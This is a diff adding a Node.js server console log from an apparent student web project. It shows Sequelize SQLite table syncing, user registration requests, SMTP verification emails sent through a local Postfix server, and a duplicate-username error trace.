@@ -1,0 +1,626 @@
+[33m[nodemon] 3.1.7[39m
+[33m[nodemon] to restart at any time, enter `rs`[39m
+[33m[nodemon] watching path(s): *.*[39m
+[33m[nodemon] watching extensions: js,mjs,cjs,json[39m
+[32m[nodemon] starting `node server/server.js`[39m
+[2024-10-03 05:16:06] DEBUG Creating transport: nodemailer (6.9.15; +https://nodemailer.com/; SMTP/6.9.15[client:6.9.15])
+Transport Created
+Executing (default): SELECT name FROM sqlite_master WHERE type='table' AND name='Users';
+Executing (default): PRAGMA TABLE_INFO(`Users`);
+Executing (default): PRAGMA foreign_key_list(`Users`)
+Executing (default): PRAGMA INDEX_LIST(`Users`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_1`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_2`)
+Executing (default): PRAGMA INDEX_INFO(`users_email`)
+Executing (default): PRAGMA INDEX_INFO(`users_username`)
+Executing (default): PRAGMA foreign_key_list(`Users`)
+Executing (default): PRAGMA TABLE_INFO(`Users`);
+Executing (default): PRAGMA INDEX_LIST(`Users`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_1`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_2`)
+Executing (default): PRAGMA INDEX_INFO(`users_email`)
+Executing (default): PRAGMA INDEX_INFO(`users_username`)
+Executing (default): PRAGMA foreign_key_list(`Users`)
+Executing (default): CREATE TABLE IF NOT EXISTS `Users_backup` (`id` INTEGER PRIMARY KEY, `username` VARCHAR(255) NOT NULL UNIQUE, `email` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `key` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
+Executing (default): INSERT INTO `Users_backup` SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users`;
+Executing (default): DROP TABLE `Users`;
+Executing (default): CREATE TABLE IF NOT EXISTS `Users` (`id` INTEGER PRIMARY KEY, `username` VARCHAR(255) NOT NULL UNIQUE, `email` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `key` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
+Executing (default): INSERT INTO `Users` SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users_backup`;
+Executing (default): DROP TABLE `Users_backup`;
+Executing (default): PRAGMA TABLE_INFO(`Users`);
+Executing (default): PRAGMA INDEX_LIST(`Users`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_1`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_2`)
+Executing (default): PRAGMA foreign_key_list(`Users`)
+Executing (default): CREATE TABLE IF NOT EXISTS `Users_backup` (`id` INTEGER PRIMARY KEY, `username` VARCHAR(255) NOT NULL UNIQUE, `email` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `key` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
+Executing (default): INSERT INTO `Users_backup` SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users`;
+Executing (default): DROP TABLE `Users`;
+Executing (default): CREATE TABLE IF NOT EXISTS `Users` (`id` INTEGER PRIMARY KEY, `username` VARCHAR(255) NOT NULL UNIQUE, `email` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `key` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
+Executing (default): INSERT INTO `Users` SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users_backup`;
+Executing (default): DROP TABLE `Users_backup`;
+Executing (default): PRAGMA TABLE_INFO(`Users`);
+Executing (default): PRAGMA INDEX_LIST(`Users`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_1`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_2`)
+Executing (default): PRAGMA foreign_key_list(`Users`)
+Executing (default): CREATE TABLE IF NOT EXISTS `Users_backup` (`id` INTEGER PRIMARY KEY, `username` VARCHAR(255) NOT NULL UNIQUE, `email` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `key` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
+Executing (default): INSERT INTO `Users_backup` SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users`;
+Executing (default): DROP TABLE `Users`;
+Executing (default): CREATE TABLE IF NOT EXISTS `Users` (`id` INTEGER PRIMARY KEY, `username` VARCHAR(255) NOT NULL UNIQUE, `email` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `key` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
+Executing (default): INSERT INTO `Users` SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users_backup`;
+Executing (default): DROP TABLE `Users_backup`;
+Executing (default): PRAGMA TABLE_INFO(`Users`);
+Executing (default): PRAGMA INDEX_LIST(`Users`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_1`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_2`)
+Executing (default): PRAGMA foreign_key_list(`Users`)
+Executing (default): CREATE TABLE IF NOT EXISTS `Users_backup` (`id` INTEGER PRIMARY KEY, `username` VARCHAR(255) NOT NULL UNIQUE, `email` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `key` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
+Executing (default): INSERT INTO `Users_backup` SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users`;
+Executing (default): DROP TABLE `Users`;
+Executing (default): CREATE TABLE IF NOT EXISTS `Users` (`id` INTEGER PRIMARY KEY, `username` VARCHAR(255) NOT NULL UNIQUE, `email` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `key` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
+Executing (default): INSERT INTO `Users` SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users_backup`;
+Server is running on http://localhost:80
+Executing (default): DROP TABLE `Users_backup`;
+Executing (default): PRAGMA TABLE_INFO(`Users`);
+Executing (default): PRAGMA INDEX_LIST(`Users`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_1`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_2`)
+Executing (default): PRAGMA foreign_key_list(`Users`)
+Executing (default): CREATE TABLE IF NOT EXISTS `Users_backup` (`id` INTEGER PRIMARY KEY, `username` VARCHAR(255) NOT NULL UNIQUE, `email` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `key` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
+Executing (default): INSERT INTO `Users_backup` SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users`;
+Executing (default): DROP TABLE `Users`;
+Executing (default): CREATE TABLE IF NOT EXISTS `Users` (`id` INTEGER PRIMARY KEY, `username` VARCHAR(255) NOT NULL UNIQUE, `email` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `key` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
+Executing (default): INSERT INTO `Users` SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users_backup`;
+Executing (default): DROP TABLE `Users_backup`;
+Executing (default): PRAGMA TABLE_INFO(`Users`);
+Executing (default): PRAGMA INDEX_LIST(`Users`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_1`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_2`)
+Executing (default): PRAGMA foreign_key_list(`Users`)
+Executing (default): CREATE TABLE IF NOT EXISTS `Users_backup` (`id` INTEGER PRIMARY KEY, `username` VARCHAR(255) NOT NULL UNIQUE, `email` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `key` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
+Executing (default): INSERT INTO `Users_backup` SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users`;
+Executing (default): DROP TABLE `Users`;
+Executing (default): CREATE TABLE IF NOT EXISTS `Users` (`id` INTEGER PRIMARY KEY, `username` VARCHAR(255) NOT NULL UNIQUE, `email` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `key` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
+Executing (default): INSERT INTO `Users` SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users_backup`;
+Executing (default): DROP TABLE `Users_backup`;
+Executing (default): PRAGMA INDEX_LIST(`Users`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_1`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_2`)
+Executing (default): CREATE UNIQUE INDEX `users_email` ON `Users` (`email`)
+Executing (default): CREATE UNIQUE INDEX `users_username` ON `Users` (`username`)
+Database & tables created!
+/ {}
+/logout {}
+/ {}
+/adduser {
+  username: 'grader+ivo53TBHTl',
+  password: 'bZHg2rRL4UEh2Y6knfWK',
+  email: 'grader+ivo53TBHTl@grading.cse356.compas.cs.stonybrook.edu'
+}
+Executing (default): INSERT INTO `Users` (`id`,`username`,`email`,`password`,`key`,`createdAt`,`updatedAt`) VALUES (NULL,$1,$2,$3,$4,$5,$6);
+[2024-10-03 05:17:34] DEBUG Sending mail using SMTP/6.9.15[client:6.9.15]
+[2024-10-03 05:17:34] DEBUG [1urEEVNpjqc] Resolved localhost as 127.0.0.1 [cache miss]
+[2024-10-03 05:17:34] INFO  [1urEEVNpjqc] Connection established to 127.0.0.1:25
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 220 warmup-2.cloud.local ESMTP Postfix (Ubuntu)
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] C: EHLO [127.0.0.1]
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 250-warmup-2.cloud.local
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 250-PIPELINING
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 250-SIZE 10240000
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 250-VRFY
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 250-ETRN
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 250-STARTTLS
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 250-ENHANCEDSTATUSCODES
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 250-8BITMIME
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 250-DSN
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 250-SMTPUTF8
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 250 CHUNKING
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] C: STARTTLS
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 220 2.0.0 Ready to start TLS
+[2024-10-03 05:17:35] INFO  [1urEEVNpjqc] Connection upgraded with STARTTLS
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] C: EHLO [127.0.0.1]
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 250-warmup-2.cloud.local
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 250-PIPELINING
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 250-SIZE 10240000
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 250-VRFY
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 250-ETRN
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 250-ENHANCEDSTATUSCODES
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 250-8BITMIME
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 250-DSN
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 250-SMTPUTF8
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 250 CHUNKING
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] SMTP handshake finished
+[2024-10-03 05:17:35] INFO  Sending message <1d682ba3-5c9d-1087-b3ff-dce5d0d466bb@wbill.cse356.compas.cs.stonybrook.edu> to <grader+ivo53TBHTl@grading.cse356.compas.cs.stonybrook.edu>
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] C: MAIL FROM:<no-reply@wbill.cse356.compas.cs.stonybrook.edu>
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 250 2.1.0 Ok
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] C: RCPT TO:<grader+ivo53TBHTl@grading.cse356.compas.cs.stonybrook.edu>
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 250 2.1.5 Ok
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] C: DATA
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 354 End data with <CR><LF>.<CR><LF>
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] From: no-reply@wbill.cse356.compas.cs.stonybrook.edu
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] To: grader+ivo53TBHTl@grading.cse356.compas.cs.stonybrook.edu
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] Subject: Verify Email for WarmUp
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] Message-ID:
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc]  <1d682ba3-5c9d-1087-b3ff-dce5d0d466bb@wbill.cse356.compas.cs.stonybrook.edu>
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] Content-Transfer-Encoding: quoted-printable
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] Date: Thu, 03 Oct 2024 05:17:34 +0000
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] MIME-Version: 1.0
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] Content-Type: text/plain; charset=utf-8
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] 
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] Please verify your email by clicking on the following link: =
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] http://localhost/?email=3Dgrader%2Bivo53TBHTl%40grading.cse356.compas.cs.=
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] stonybrook.edu&key=3D%026%EF%BF%BD%EF%BF%BD%CB%A2%23Xs9%EF%BF%BD%EF%BF%BD%E=
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] F%BF%BDT%EF%BF%BD%3Ea%EF%BF%BDe%26%EF%BF%BD%21%0DY%EF%BF%BD%EF%BF%BD%EF%BF%=
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] BD%EF%BF%BDMG
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] .
+[2024-10-03 05:17:35] INFO  [1urEEVNpjqc] <702 bytes encoded mime message (source size 699 bytes)>
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] S: 250 2.0.0 Ok: queued as 32A3AFC918
+[2024-10-03 05:17:35] DEBUG [1urEEVNpjqc] Closing connection to the server using "end"
+{
+  accepted: [ 'grader+ivo53TBHTl@grading.cse356.compas.cs.stonybrook.edu' ],
+  rejected: [],
+  ehlo: [
+    'PIPELINING',
+    'SIZE 10240000',
+    'VRFY',
+    'ETRN',
+    'ENHANCEDSTATUSCODES',
+    '8BITMIME',
+    'DSN',
+    'SMTPUTF8',
+    'CHUNKING'
+  ],
+  envelopeTime: 47,
+  messageTime: 57,
+  messageSize: 702,
+  response: '250 2.0.0 Ok: queued as 32A3AFC918',
+  envelope: {
+    from: 'no-reply@wbill.cse356.compas.cs.stonybrook.edu',
+    to: [ 'grader+ivo53TBHTl@grading.cse356.compas.cs.stonybrook.edu' ]
+  },
+  messageId: '<1d682ba3-5c9d-1087-b3ff-dce5d0d466bb@wbill.cse356.compas.cs.stonybrook.edu>'
+}
+[2024-10-03 05:17:35] INFO  [1urEEVNpjqc] Connection closed
+/adduser {
+  username: 'grader+ivo53TBHTl',
+  password: 'dango-daikazoku',
+  email: 'grader+ivo53TBHTl@grading.cse356.compas.cs.stonybrook.edu'
+}
+Executing (default): INSERT INTO `Users` (`id`,`username`,`email`,`password`,`key`,`createdAt`,`updatedAt`) VALUES (NULL,$1,$2,$3,$4,$5,$6);
+Unable to create user Error
+    at Database.<anonymous> (/root/warmup-proj-2/warm-up-2/node_modules/sequelize/lib/dialects/sqlite/query.js:185:27)
+    at /root/warmup-proj-2/warm-up-2/node_modules/sequelize/lib/dialects/sqlite/query.js:183:50
+    at new Promise (<anonymous>)
+    at Query.run (/root/warmup-proj-2/warm-up-2/node_modules/sequelize/lib/dialects/sqlite/query.js:183:12)
+    at /root/warmup-proj-2/warm-up-2/node_modules/sequelize/lib/sequelize.js:315:28
+    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)
+    at async SQLiteQueryInterface.insert (/root/warmup-proj-2/warm-up-2/node_modules/sequelize/lib/dialects/abstract/query-interface.js:308:21)
+    at async model.save (/root/warmup-proj-2/warm-up-2/node_modules/sequelize/lib/model.js:2490:35)
+    at async /root/warmup-proj-2/warm-up-2/server/server.js:80:7 {
+  name: 'SequelizeUniqueConstraintError',
+  errors: [
+    ValidationErrorItem {
+      message: 'username must be unique',
+      type: 'unique violation',
+      path: 'username',
+      value: 'grader+ivo53TBHTl',
+      origin: 'DB',
+      instance: [Users],
+      validatorKey: 'not_unique',
+      validatorName: null,
+      validatorArgs: []
+    }
+  ],
+  parent: [Error: SQLITE_CONSTRAINT: UNIQUE constraint failed: Users.username] {
+    errno: 19,
+    code: 'SQLITE_CONSTRAINT',
+    sql: 'INSERT INTO `Users` (`id`,`username`,`email`,`password`,`key`,`createdAt`,`updatedAt`) VALUES (NULL,$1,$2,$3,$4,$5,$6);'
+  },
+  original: [Error: SQLITE_CONSTRAINT: UNIQUE constraint failed: Users.username] {
+    errno: 19,
+    code: 'SQLITE_CONSTRAINT',
+    sql: 'INSERT INTO `Users` (`id`,`username`,`email`,`password`,`key`,`createdAt`,`updatedAt`) VALUES (NULL,$1,$2,$3,$4,$5,$6);'
+  },
+  fields: [ 'username' ],
+  sql: 'INSERT INTO `Users` (`id`,`username`,`email`,`password`,`key`,`createdAt`,`updatedAt`) VALUES (NULL,$1,$2,$3,$4,$5,$6);'
+}
+[32m[nodemon] restarting due to changes...[39m
+[32m[nodemon] starting `node server/server.js`[39m
+[2024-10-03 05:19:58] DEBUG Creating transport: nodemailer (6.9.15; +https://nodemailer.com/; SMTP/6.9.15[client:6.9.15])
+Transport Created
+Executing (default): SELECT name FROM sqlite_master WHERE type='table' AND name='Users';
+Executing (default): PRAGMA TABLE_INFO(`Users`);
+Executing (default): PRAGMA foreign_key_list(`Users`)
+Executing (default): PRAGMA INDEX_LIST(`Users`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_1`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_2`)
+Executing (default): PRAGMA INDEX_INFO(`users_email`)
+Executing (default): PRAGMA INDEX_INFO(`users_username`)
+Executing (default): PRAGMA foreign_key_list(`Users`)
+Executing (default): PRAGMA TABLE_INFO(`Users`);
+Executing (default): PRAGMA INDEX_LIST(`Users`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_1`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_2`)
+Executing (default): PRAGMA INDEX_INFO(`users_email`)
+Executing (default): PRAGMA INDEX_INFO(`users_username`)
+Executing (default): PRAGMA foreign_key_list(`Users`)
+Executing (default): CREATE TABLE IF NOT EXISTS `Users_backup` (`id` INTEGER PRIMARY KEY, `username` VARCHAR(255) NOT NULL UNIQUE, `email` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `key` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
+Executing (default): INSERT INTO `Users_backup` SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users`;
+Executing (default): DROP TABLE `Users`;
+Executing (default): CREATE TABLE IF NOT EXISTS `Users` (`id` INTEGER PRIMARY KEY, `username` VARCHAR(255) NOT NULL UNIQUE, `email` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `key` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
+Executing (default): INSERT INTO `Users` SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users_backup`;
+Executing (default): DROP TABLE `Users_backup`;
+Executing (default): PRAGMA TABLE_INFO(`Users`);
+Executing (default): PRAGMA INDEX_LIST(`Users`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_1`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_2`)
+Executing (default): PRAGMA foreign_key_list(`Users`)
+Executing (default): CREATE TABLE IF NOT EXISTS `Users_backup` (`id` INTEGER PRIMARY KEY, `username` VARCHAR(255) NOT NULL UNIQUE, `email` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `key` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
+Executing (default): INSERT INTO `Users_backup` SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users`;
+Executing (default): DROP TABLE `Users`;
+Executing (default): CREATE TABLE IF NOT EXISTS `Users` (`id` INTEGER PRIMARY KEY, `username` VARCHAR(255) NOT NULL UNIQUE, `email` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `key` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
+Executing (default): INSERT INTO `Users` SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users_backup`;
+Executing (default): DROP TABLE `Users_backup`;
+Executing (default): PRAGMA TABLE_INFO(`Users`);
+Executing (default): PRAGMA INDEX_LIST(`Users`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_1`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_2`)
+Executing (default): PRAGMA foreign_key_list(`Users`)
+Executing (default): CREATE TABLE IF NOT EXISTS `Users_backup` (`id` INTEGER PRIMARY KEY, `username` VARCHAR(255) NOT NULL UNIQUE, `email` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `key` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
+Executing (default): INSERT INTO `Users_backup` SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users`;
+Executing (default): DROP TABLE `Users`;
+Executing (default): CREATE TABLE IF NOT EXISTS `Users` (`id` INTEGER PRIMARY KEY, `username` VARCHAR(255) NOT NULL UNIQUE, `email` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `key` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
+Executing (default): INSERT INTO `Users` SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users_backup`;
+Executing (default): DROP TABLE `Users_backup`;
+Executing (default): PRAGMA TABLE_INFO(`Users`);
+Executing (default): PRAGMA INDEX_LIST(`Users`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_1`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_2`)
+Executing (default): PRAGMA foreign_key_list(`Users`)
+Executing (default): CREATE TABLE IF NOT EXISTS `Users_backup` (`id` INTEGER PRIMARY KEY, `username` VARCHAR(255) NOT NULL UNIQUE, `email` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `key` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
+Executing (default): INSERT INTO `Users_backup` SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users`;
+Executing (default): DROP TABLE `Users`;
+Executing (default): CREATE TABLE IF NOT EXISTS `Users` (`id` INTEGER PRIMARY KEY, `username` VARCHAR(255) NOT NULL UNIQUE, `email` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `key` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
+Executing (default): INSERT INTO `Users` SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users_backup`;
+Executing (default): DROP TABLE `Users_backup`;
+Server is running on http://localhost:80
+Executing (default): PRAGMA TABLE_INFO(`Users`);
+Executing (default): PRAGMA INDEX_LIST(`Users`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_1`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_2`)
+Executing (default): PRAGMA foreign_key_list(`Users`)
+Executing (default): CREATE TABLE IF NOT EXISTS `Users_backup` (`id` INTEGER PRIMARY KEY, `username` VARCHAR(255) NOT NULL UNIQUE, `email` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `key` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
+Executing (default): INSERT INTO `Users_backup` SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users`;
+Executing (default): DROP TABLE `Users`;
+Executing (default): CREATE TABLE IF NOT EXISTS `Users` (`id` INTEGER PRIMARY KEY, `username` VARCHAR(255) NOT NULL UNIQUE, `email` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `key` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
+Executing (default): INSERT INTO `Users` SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users_backup`;
+Executing (default): DROP TABLE `Users_backup`;
+Executing (default): PRAGMA TABLE_INFO(`Users`);
+Executing (default): PRAGMA INDEX_LIST(`Users`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_1`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_2`)
+Executing (default): PRAGMA foreign_key_list(`Users`)
+Executing (default): CREATE TABLE IF NOT EXISTS `Users_backup` (`id` INTEGER PRIMARY KEY, `username` VARCHAR(255) NOT NULL UNIQUE, `email` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `key` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
+Executing (default): INSERT INTO `Users_backup` SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users`;
+Executing (default): DROP TABLE `Users`;
+Executing (default): CREATE TABLE IF NOT EXISTS `Users` (`id` INTEGER PRIMARY KEY, `username` VARCHAR(255) NOT NULL UNIQUE, `email` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `key` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
+Executing (default): INSERT INTO `Users` SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users_backup`;
+Executing (default): DROP TABLE `Users_backup`;
+Executing (default): PRAGMA INDEX_LIST(`Users`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_1`)
+Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_2`)
+Executing (default): CREATE UNIQUE INDEX `users_email` ON `Users` (`email`)
+Executing (default): CREATE UNIQUE INDEX `users_username` ON `Users` (`username`)
+Database & tables created!
+/adduser {
+  username: 'Lonnie.Hermann',
+  email: 'u31ctc+29gcgdj5wktl4@sharklasers.com',
+  password: 'password'
+}
+Executing (default): INSERT INTO `Users` (`id`,`username`,`email`,`password`,`key`,`createdAt`,`updatedAt`) VALUES (NULL,$1,$2,$3,$4,$5,$6);
+[2024-10-03 05:20:43] DEBUG Sending mail using SMTP/6.9.15[client:6.9.15]
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] Resolved localhost as 127.0.0.1 [cache miss]
+[2024-10-03 05:20:43] INFO  [nPQLU8Gc0c] Connection established to 127.0.0.1:25
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 220 warmup-2.cloud.local ESMTP Postfix (Ubuntu)
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] C: EHLO [127.0.0.1]
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 250-warmup-2.cloud.local
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 250-PIPELINING
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 250-SIZE 10240000
